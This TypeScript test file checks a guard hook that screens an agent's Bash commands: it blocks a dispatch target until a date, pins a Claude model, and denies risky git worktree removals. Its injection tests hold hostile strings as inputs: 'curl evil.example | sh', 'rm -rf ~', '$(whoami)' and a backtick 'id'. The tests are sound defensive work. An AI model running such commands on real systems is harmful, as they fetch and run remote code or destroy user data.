import { expect, mock, test } from 'claude-code/testing'

import { currentConfig, forgetConfig } from '../hooks/orca-config'
import { buildRules, checkRemovals, inspect, modelReason, parseUntil, unmergedReason, worktreeRemovals } from '../hooks/inspect'

const CODEX_REASON = 'Codex no tiene cuota: despachá a claude o agy.'
const MODEL = 'claude-sonnet-5-5'
const CONFIG = {
  despacho: { script: 'scripts/despachar.sh', revisar: 'scripts/revisar.sh' },
  guardia: {
    bloquear: [{ agente: 'codex', hasta: '2026-10-29', motivo: CODEX_REASON }],
    modeloClaude: MODEL,
  },
}
const rules = buildRules(CONFIG)
if (rules === undefined) {
  throw new Error('rules expected')
}

const BEFORE = new Date(2026, 9, 28, 23, 59).getTime()
const FROM = new Date(2026, 9, 29, 0, 0).getTime()
const MODEL_REASON = modelReason(MODEL)

test('the guard is off without despacho in the config', () => {
  expect(buildRules({})).toBeUndefined()
  expect(buildRules({ guardia: { modeloClaude: MODEL } })).toBeUndefined()
  expect(buildRules({ despacho: { script: '  ' } })).toBeUndefined()
})

test('hasta is a local-midnight date and bad dates are ignored', () => {
  expect(parseUntil('2026-10-29')).toBe(FROM)
  expect(parseUntil('29/10/2026')).toBeUndefined()
  const only = buildRules({
    despacho: { script: 'a.sh' },
    guardia: { bloquear: [{ agente: 'codex', hasta: 'mañana' }] },
  })
  expect(only?.blocks).toEqual([])
})

test('a block without motivo gets a default message', () => {
  const r = buildRules({
    despacho: { script: 'x/go.sh' },
    guardia: { bloquear: [{ agente: 'Codex', hasta: '2026-10-29' }] },
  })
  expect(inspect('./x/go.sh 5 codex', BEFORE, r!)).toEqual({
    kind: 'deny',
    reason: 'Codex está bloqueado hasta el 2026-10-29.',
  })
})

test('codex is denied until the date and allowed from it', () => {
  const lines = [
    './scripts/despachar.sh 582 codex',
    'scripts/revisar.sh 612 codex',
    'CODEX_ESFUERZO=high ./scripts/despachar.sh 582 codex',
    'bash scripts/despachar.sh 582 codex --reusar-agente',
  ]
  for (const line of lines) {
    expect(inspect(line, BEFORE, rules)).toEqual({ kind: 'deny', reason: CODEX_REASON })
    expect(inspect(line, FROM, rules)).toEqual({ kind: 'pass' })
  }
})

test('claude without the model is rewritten, with it passes, other model denied', () => {
  expect(inspect('./scripts/despachar.sh 582 claude', FROM, rules)).toEqual({
    kind: 'rewrite',
    command: `CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 582 claude`,
  })
  expect(inspect(`CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 582 claude`, FROM, rules)).toEqual({
    kind: 'pass',
  })
  expect(
    inspect(`export CLAUDE_MODELO=${MODEL} && ./scripts/despachar.sh 582 claude`, FROM, rules),
  ).toEqual({ kind: 'pass' })
  expect(inspect('CLAUDE_MODELO=claude-opus-4 ./scripts/despachar.sh 582 claude', FROM, rules)).toEqual({
    kind: 'deny',
    reason: MODEL_REASON,
  })
})

test('without modeloClaude claude passes untouched', () => {
  const noModel = buildRules({ despacho: { script: 'scripts/despachar.sh' } })
  expect(inspect('./scripts/despachar.sh 582 claude', FROM, noModel!)).toEqual({ kind: 'pass' })
})

test('agy, other scripts and non-invocations pass', () => {
  for (const line of [
    './scripts/despachar.sh 582 agy',
    'scripts/revisar.sh 612 agy',
    'grep despachar.sh docs/',
    'grep -rn "codex" scripts/revisar.sh',
    'cat scripts/revisar.sh',
    'git log --oneline',
    'echo "despachar.sh 5 codex"',
    './scripts/revisar.sh 612 claude',
  ]) {
    expect(inspect(line, BEFORE, rules)).toEqual({ kind: 'pass' })
  }
})

test('multi-command lines are inspected segment by segment', () => {
  expect(inspect('git pull && ./scripts/despachar.sh 5 codex', BEFORE, rules)).toEqual({
    kind: 'deny',
    reason: CODEX_REASON,
  })
  expect(
    inspect('git pull && ./scripts/despachar.sh 5 agy && ./scripts/despachar.sh 6 claude', FROM, rules),
  ).toEqual({
    kind: 'rewrite',
    command: `git pull && ./scripts/despachar.sh 5 agy && CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 6 claude`,
  })
  expect(inspect('echo hola; ./scripts/despachar.sh 7 claude | tee log', FROM, rules)).toEqual({
    kind: 'rewrite',
    command: `echo hola; CLAUDE_MODELO=${MODEL} ./scripts/despachar.sh 7 claude | tee log`,
  })
})

test('PowerShell gets the $env form of the rewrite', () => {
  expect(inspect('bash scripts/despachar.sh 5 claude', FROM, rules, 'powershell')).toEqual({
    kind: 'rewrite',
    command: `$env:CLAUDE_MODELO='${MODEL}'; bash scripts/despachar.sh 5 claude`,
  })
})

// The world beneath the plugin: a fake home and repo holding the config layers.
// The engine resolves paths for the host OS (a Windows path like C:, then work, then repo); compare them as /work/repo.
const norm = (path: string): string => path.replace(/^[A-Za-z]:/, '').split(String.fromCharCode(92)).join('/')
const files = (on: Parameters<typeof mock.clock>[0], layers: Record<string, unknown>) => {
  mock.env(on, { HOME: '/home/u' })
  on('process.run', () => ({
    value: {
      exitCode: 0,
      stdout: '/work/repo/.git\n/work/repo/wt\n',
      stderr: '',
      isStdoutTruncated: false,
      isStderrTruncated: false,
    },
  }))
  on('fs.exists', (_$, e) => ({ value: norm(e.path) in layers }))
  on('fs.read', (_$, e) => ({ value: JSON.stringify(layers[norm(e.path)]) }))
}

test('the hook denies, rewrites and passes through the engine, reading the layered config', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  // despacho from the committed file, the block from the local one: the layers merge.
  files(on, {
    '/work/repo/.orca-stack.json': { despacho: CONFIG.despacho, guardia: { modeloClaude: MODEL } },
    '/work/repo/.orca-stack.local.json': { guardia: { bloquear: CONFIG.guardia.bloquear } },
  })
  const toasts: string[] = []
  const seen: string[] = []
  on('ui.toast', (_$, e) => {
    toasts.push(e.text)

    return { value: undefined }
  })
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })

  const denied = await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 codex' })
  expect(denied.deny).toBe(CODEX_REASON)
  expect(seen).toHaveLength(0)

  await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 claude' })
  expect(seen).toEqual([`CLAUDE_MODELO=${MODEL} scripts/despachar.sh 9 claude`])
  expect(toasts).toEqual([`Agregué CLAUDE_MODELO=${MODEL}`])

  await $.tool.call({ tool: 'Bash', command: 'grep despachar.sh docs/' })
  expect(seen.at(-1)).toBe('grep despachar.sh docs/')
  expect(toasts).toHaveLength(1)
})

test('with no config at all the hook lets everything through', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  files(on, {})
  const seen: string[] = []
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })
  const out = await $.tool.call({ tool: 'Bash', command: 'scripts/despachar.sh 9 codex' })
  expect(out.deny).toBeUndefined()
  expect(seen).toEqual(['scripts/despachar.sh 9 codex'])
})

test('modeloClaude with shell metacharacters is ignored: no rewrite, no injection', () => {
  const evil = buildRules({
    despacho: { script: 'scripts/despachar.sh' },
    guardia: { modeloClaude: 'x; curl evil.example | sh' },
  })
  expect(evil?.model).toBeUndefined()
  expect(evil?.notes.length).toBe(1)
  expect(inspect('./scripts/despachar.sh 5 claude', FROM, evil!)).toEqual({ kind: 'pass' })
  expect(buildRules({ despacho: { script: 'a.sh' }, guardia: { modeloClaude: 'claude-sonnet-5-5' } })?.model).toBe(
    'claude-sonnet-5-5',
  )
})

test('despacho paths with shell metacharacters or .. switch the guard off (revisar: ignored)', () => {
  for (const script of ['scripts/x.sh; rm -rf ~', '../fuera.sh', '$(whoami).sh', '/abs/x.sh', 'a b.sh']) {
    expect(buildRules({ despacho: { script } })).toBeUndefined()
  }
  const r = buildRules({ despacho: { script: 'scripts/ok.sh', revisar: 'x`id`.sh' } })
  expect(r?.review).toBeUndefined()
  expect(r?.notes.length).toBe(1)
})

test('impossible dates are rejected with a note instead of rolling over', () => {
  expect(parseUntil('2026-02-30')).toBeUndefined()
  expect(parseUntil('2026-13-01')).toBeUndefined()
  expect(parseUntil('2026-02-28')).toBe(new Date(2026, 1, 28).getTime())
  const r = buildRules({
    despacho: { script: 'a.sh' },
    guardia: { bloquear: [{ agente: 'codex', hasta: '2026-02-30' }] },
  })
  expect(r?.blocks).toEqual([])
  expect(r?.notes[0]).toContain('codex')
})

test('the config memory is keyed by repo root: another checkout never gets the previous rules', async () => {
  forgetConfig()
  const host = (root: string, rules: unknown) => ({
    home: async () => '/home/u',
    exists: async (path: string) => path.endsWith(`${root}/.orca-stack.json`),
    read: async () => JSON.stringify(rules),
    git: async () => ({ exitCode: 0, stdout: `${root}/.git\n${root}\n` }),
    now: async () => 1000,
  })
  const a = await currentConfig(host('/work/a', { despacho: { script: 'a.sh' } }))
  const b = await currentConfig(host('/work/b', { despacho: { script: 'b.sh' } }))
  expect(a.despacho?.script).toBe('a.sh')
  expect(b.despacho?.script).toBe('b.sh')
  forgetConfig()
})

const PORCELAIN =
  'worktree C:/r/repo\nHEAD aaa\nbranch refs/heads/main\n\n' +
  'worktree C:/r/ws/issue-5\nHEAD bbb\nbranch refs/heads/me/5-fix\n\n' +
  'worktree C:/r/ws/issue-6\nHEAD ccc\ndetached\n'

test('worktreeRemovals finds orca and git removals in bash and PowerShell forms only', () => {
  expect(worktreeRemovals('orca worktree rm --worktree branch:me/5-fix --json')).toEqual([{ by: 'branch', value: 'me/5-fix' }])
  expect(worktreeRemovals('orca worktree rm --worktree=issue:5')).toEqual([{ by: 'issue', value: '5' }])
  const bs = String.fromCharCode(92)
  expect(worktreeRemovals(`orca.cmd worktree rm --worktree "path:C:${bs}r${bs}ws${bs}issue-5"`)).toEqual([
    { by: 'path', value: `C:${bs}r${bs}ws${bs}issue-5` },
  ])
  expect(worktreeRemovals('git -C ../repo worktree remove -f C:/r/ws/issue-5')).toEqual([{ by: 'path', value: 'C:/r/ws/issue-5' }])
  expect(worktreeRemovals(`cd x; & git worktree remove ..${bs}ws${bs}issue-5`)).toEqual([{ by: 'path', value: `..${bs}ws${bs}issue-5` }])
  expect(worktreeRemovals('orca worktree rm')).toEqual([{ by: 'none', value: '' }])
  for (const line of ['orca worktree ps --json', 'git worktree list', 'echo "orca worktree rm"', 'grep -r "git worktree remove" docs/']) {
    expect(worktreeRemovals(line)).toEqual([])
  }
})

// Orca links issue 5 to ws/issue-5 and issue 7 to ws/issue-6 (the folder name says nothing about the link).
const PS = JSON.stringify({
  result: {
    worktrees: [
      { path: 'C:/r/ws/issue-5', linkedIssue: 5 },
      { path: 'C:/r/ws/issue-6', linkedIssue: 7 },
      { path: 'C:/other/repo/issue-9', linkedIssue: 9 },
    ],
  },
})

type FakeOpts = { listFails?: boolean; logFails?: boolean; dirty?: string; statusFails?: boolean; psFails?: boolean; porcelain?: string }

const fakeGit = (unmerged: string, opts: FakeOpts = {}) => {
  const calls: string[][] = []
  const git = async (argv: string[]) => {
    calls.push(argv)
    if (argv[0] === 'orca') {
      return { exitCode: opts.psFails === true ? 1 : 0, stdout: PS }
    }
    if (argv[3] === 'status') {
      return { exitCode: opts.statusFails === true ? 128 : 0, stdout: opts.dirty ?? '' }
    }
    if (argv[2] === 'list') {
      return { exitCode: opts.listFails === true ? 1 : 0, stdout: opts.porcelain ?? PORCELAIN }
    }

    return { exitCode: opts.logFails === true ? 128 : 0, stdout: unmerged }
  }

  return { git, calls }
}

test('a worktree whose branch has commits outside every remote is denied, naming them', async () => {
  const { git, calls } = fakeGit('abc1234 feat: algo\ndef5678 fix: otro\n')
  const reason = await checkRemovals('orca worktree rm --worktree issue:5', git)
  expect(reason).toBe(unmergedReason('me/5-fix', ['abc1234 feat: algo', 'def5678 fix: otro']))
  expect(reason).toContain('OK del humano')
  expect(calls.find(call => call[1] === 'log')).toEqual(['git', 'log', 'refs/heads/me/5-fix', '--not', '--remotes', '--oneline'])
  expect(await checkRemovals('git worktree remove C:/r/ws/issue-5', git)).toContain('abc1234')
})

test('a published branch, a detached worktree and non-removals pass', async () => {
  const clean = fakeGit('')
  expect(await checkRemovals('orca worktree rm --worktree branch:me/5-fix', clean.git)).toBeUndefined()
  expect(await checkRemovals('git worktree remove ../ws/issue-6', fakeGit('x y').git)).toBeUndefined()
  const none = fakeGit('x y')
  expect(await checkRemovals('orca worktree ps --json && git status', none.git)).toBeUndefined()
  expect(none.calls).toEqual([])
})

test('anything git cannot resolve is denied (fail closed)', async () => {
  expect(await checkRemovals('orca worktree rm --worktree issue:5', fakeGit('', { listFails: true }).git)).toContain('No pude')
  expect(await checkRemovals('orca worktree rm --worktree issue:5', fakeGit('', { logFails: true }).git)).toContain('falló')
  expect(await checkRemovals('orca worktree rm --worktree issue:99', fakeGit('').git)).toContain('no encuentro')
  expect(await checkRemovals('orca worktree rm --worktree issue:5', fakeGit('', { psFails: true }).git)).toContain('orca worktree ps falló')
  expect(await checkRemovals('git worktree remove C:/r/ws/issue-5', fakeGit('', { statusFails: true }).git)).toContain('git status')
  expect(await checkRemovals('orca worktree rm', fakeGit('').git)).toContain('sin selector')
  const boom = async (): Promise<never> => {
    throw new Error('sin git')
  }
  expect(await checkRemovals('git worktree remove x', boom)).toContain('no pude correr git')
})

test('the hook denies a worktree removal through the engine even with no config', async ($, on) => {
  forgetConfig()
  mock.clock(on, { now: BEFORE })
  mock.env(on, { HOME: '/home/u' })
  on('fs.exists', () => ({ value: false }))
  on('process.run', (_$, e) => ({
    value: {
      exitCode: 0,
      stdout: e.argv[0] === 'orca' ? PS : e.argv[3] === 'status' ? '' : e.argv[2] === 'list' ? PORCELAIN : e.argv[0] === 'git' && e.argv[1] === 'log' ? 'abc1234 wip\n' : '/work/repo/.git\n/work/repo\n',
      stderr: '',
      isStdoutTruncated: false,
      isStderrTruncated: false,
    },
  }))
  const seen: string[] = []
  on('tool.call', { tool: 'Bash' }, (_$, e) => {
    seen.push(e.command)

    return { result: { stdout: '', stderr: '', interrupted: false } as never }
  })
  const out = await $.tool.call({ tool: 'Bash', command: 'orca worktree rm --worktree issue:5' })
  expect(out.deny).toContain('abc1234 wip')
  expect(seen).toHaveLength(0)
  await $.tool.call({ tool: 'Bash', command: 'git status' })
  expect(seen).toEqual(['git status'])
})

test('removals are found anywhere in a segment: loops, if, foreach, sudo, xargs', () => {
  const forms = [
    'for w in a b; do orca worktree rm --worktree "$w"; done',
    'if true; then orca worktree rm --worktree issue:5; fi',
    'foreach ($w in $x) { orca worktree rm --worktree $w }',
    'foreach ($w in $x) {orca worktree rm --worktree "$w"}',
    'sudo orca worktree rm --worktree issue:5',
    'ls | xargs orca worktree rm',
    'ls | xargs -n1 git worktree remove',
    'while read w; do git -C /r worktree remove "$w"; done',
  ]
  for (const form of forms) {
    expect(worktreeRemovals(form).length, form).toBeGreaterThan(0)
  }
  // Loop variables cannot be resolved: no target is named.
  expect(worktreeRemovals('for w in a; do orca worktree rm --worktree "$w"; done')).toEqual([{ by: 'none', value: '$w' }])
  expect(worktreeRemovals('ls | xargs orca worktree rm')).toEqual([{ by: 'none', value: '' }])
  expect(worktreeRemovals('if true; then orca worktree rm --worktree issue:5; fi')).toEqual([{ by: 'issue', value: '5' }])
  for (const quoted of ['echo "orca worktree rm"', `echo 'for w in x; do git worktree remove "$w"; done'`, 'echo "a; orca worktree rm --worktree issue:5"']) {
    expect(worktreeRemovals(quoted), quoted).toEqual([])
  }
})

test('a shell given the removal as text is opaque; -EncodedCommand always is', () => {
  const opaque = [
    `bash -c 'for w in a; do orca worktree rm --worktree "$w"; done'`,
    `sh -lc 'cd x; orca worktree rm --worktree issue:5'`,
    'pwsh -Command "foreach ($w in $x) { git worktree remove $w }"',
    'powershell -NoProfile -Command "orca worktree rm --worktree issue:5"',
    'pwsh -EncodedCommand ZQBjAGgAbwA=',
    'cmd /c "git worktree remove x"',
    'iex "orca worktree rm --worktree issue:5"',
  ]
  for (const form of opaque) {
    expect(worktreeRemovals(form).map(one => one.by), form).toEqual(['opaque'])
  }
  expect(worktreeRemovals(`bash -c 'ls -la'`)).toEqual([])
  expect(worktreeRemovals('bash script.sh')).toEqual([])
})

test('the guard denies every form whose target cannot be resolved', async () => {
  const forms = [
    'for w in a b; do orca worktree rm --worktree "$w"; done',
    'foreach ($w in $x) { orca worktree rm --worktree $w }',
    'ls | xargs orca worktree rm',
    `bash -c 'orca worktree rm --worktree issue:5'`,
    'pwsh -Command "git worktree remove x"',
    'pwsh -EncodedCommand ZQBjAGgAbwA=',
  ]
  for (const form of forms) {
    expect(await checkRemovals(form, fakeGit('').git), form).toContain('OK del humano')
  }
  expect(await checkRemovals('echo "orca worktree rm --worktree issue:5"', fakeGit('').git)).toBeUndefined()
  // A resolvable target inside an if/then body still gets the usual checks.
  expect(await checkRemovals('if true; then orca worktree rm --worktree issue:5; fi', fakeGit('abc1234 wip').git)).toContain('abc1234')
})

test('issue:N is resolved by the linked issue, as Orca does, not by the folder name', async () => {
  const clean = fakeGit('')
  // issue:7 is linked to ws/issue-6 (detached, nothing to lose); no folder is called issue-7.
  expect(await checkRemovals('orca worktree rm --worktree issue:7', clean.git)).toBeUndefined()
  expect(clean.calls.some(call => call.join(' ') === 'orca worktree ps --json')).toBe(true)
  // issue:6 has a folder issue-6 but no link: not found, denied.
  expect(await checkRemovals('orca worktree rm --worktree issue:6', fakeGit('').git)).toContain('no encuentro')
  // a link in another repo is not this repo's worktree
  expect(await checkRemovals('orca worktree rm --worktree issue:9', fakeGit('').git)).toContain('no encuentro')
})

test('uncommitted changes deny the removal; untracked .atl/ does not count', async () => {
  const dirty = await checkRemovals('orca worktree rm --worktree branch:me/5-fix', fakeGit('', { dirty: ' M src/a.ts\n?? notes.md\n' }).git)
  expect(dirty).toContain('cambios sin commitear')
  expect(dirty).toContain('src/a.ts')
  expect(await checkRemovals('git worktree remove ../ws/issue-6', fakeGit('', { dirty: ' M x\n' }).git)).toContain('cambios sin commitear')
  const atl = fakeGit('', { dirty: '?? .atl/\n?? .atl/skill-registry.md\n' })
  expect(await checkRemovals('orca worktree rm --worktree branch:me/5-fix', atl.git)).toBeUndefined()
  expect(atl.calls.find(call => call[3] === 'status')).toEqual(['git', '-C', 'C:/r/ws/issue-5', 'status', '--porcelain'])
})

test('a quoted executable is still a removal; quoted text is not', async () => {
  const bs = String.fromCharCode(92)
  const forms = [
    `& "C:${bs}Program Files${bs}Orca${bs}orca.exe" worktree rm --worktree branch:x`,
    `& "C:${bs}Program Files${bs}Git${bs}cmd${bs}git.exe" worktree remove ..${bs}ws${bs}x`,
    '"orca" worktree rm --worktree branch:x',
    `pwsh -Command "& 'C:${bs}Program Files${bs}Orca${bs}orca.exe' worktree rm --worktree branch:x"`,
  ]
  for (const form of forms) {
    expect(worktreeRemovals(form).length, form).toBeGreaterThan(0)
    expect(await checkRemovals(form, fakeGit('').git), form).toContain('OK del humano')
  }
  expect(worktreeRemovals(forms[0] ?? '')).toEqual([{ by: 'branch', value: 'x' }])
  expect(worktreeRemovals('echo "orca worktree rm --worktree branch:x"')).toEqual([])
})

test('every -EncodedCommand abbreviation is denied, and -ExecutionPolicy is not one', () => {
  for (const flag of ['-e', '-en', '-enc', '-enco', '-encodedc', '-EncodedCommand', '-ec', '-EC']) {
    expect(worktreeRemovals(`pwsh ${flag} ZQBjAGgAbwA=`).map(one => one.by), flag).toEqual(['opaque'])
    expect(worktreeRemovals(`powershell -NoProfile ${flag} ZQBjAGgAbwA=`).map(one => one.by), flag).toEqual(['opaque'])
  }
  expect(worktreeRemovals('pwsh -ExecutionPolicy Bypass -File x.ps1')).toEqual([])
  expect(worktreeRemovals('bash -e script.sh')).toEqual([])
})

test('PowerShell: the first positional argument is command text, and / is a flag prefix', () => {
  for (const form of ['powershell "orca worktree rm --worktree branch:x"', 'pwsh /Command "orca worktree rm --worktree branch:x"', 'powershell /enc ZQBjAGgAbwA=', 'pwsh -NoProfile -ExecutionPolicy Bypass "orca worktree rm --worktree branch:x"', 'powershell "orca worktree rm --worktree branch:x" -c', 'powershell -s "orca worktree rm --worktree branch:x"']) {
    expect(worktreeRemovals(form).map(one => one.by), form).toEqual(['opaque'])
  }
  for (const form of ['powershell -File build.ps1', 'powershell -ExecutionPolicy Bypass -File build.ps1', 'powershell build.ps1', 'powershell "echo hi"']) {
    expect(worktreeRemovals(form), form).toEqual([])
  }
})

test('path and name selectors must resolve to exactly one worktree', async () => {
  const porcelain = PORCELAIN + '\nworktree C:/r/other/issue-5\nHEAD ddd\nbranch refs/heads/other/5\n'
  const two = fakeGit('', { porcelain })
  expect(await checkRemovals('git worktree remove issue-5', two.git)).toContain('más de un worktree')
  expect(await checkRemovals('orca worktree rm --worktree name:issue-5', two.git)).toContain('más de un worktree')
  // an exact path still resolves to one
  expect(await checkRemovals('git worktree remove C:/r/ws/issue-5', fakeGit('', { porcelain }).git)).toBeUndefined()
  // a single suffix match is fine
  expect(await checkRemovals('git worktree remove ../ws/issue-6', fakeGit('').git)).toBeUndefined()
})
